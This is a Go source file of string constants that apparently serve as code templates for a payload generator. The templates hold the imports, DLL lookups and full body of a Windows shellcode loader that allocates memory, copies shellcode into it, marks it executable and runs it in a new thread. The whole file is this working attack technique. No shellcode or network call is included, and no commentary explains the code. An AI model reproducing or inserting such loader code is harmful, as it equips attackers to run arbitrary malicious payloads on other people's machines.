package local

const CreateThreadNativeImports = `
	"fmt"
	"log"
	"os"
	"time"
	"unsafe"

	"github.com/salukikit/go-util/pkg/box"

	// Sub Repositories

	"golang.org/x/sys/windows"
`
const CreateThreadNativeDlls = `
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	CreateThread := kernel32.NewProc("CreateThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
`
const CreateThreadNative = `
	addr, errVirtualAlloc := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAlloc failed and returned 0")
	}

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
	}

	var oldProtect uint32
	errVirtualProtect := windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if errVirtualProtect != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	CreateThread := kernel32.NewProc("CreateThread")
	thread, _, errCreateThread := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)

	if errCreateThread != nil && errCreateThread.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateThread:\r\n%s", errCreateThread.Error()))
	}

	_, errWaitForSingleObject := windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
	if errWaitForSingleObject != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling WaitForSingleObject:\r\n:%s", errWaitForSingleObject.Error()))
	}
`
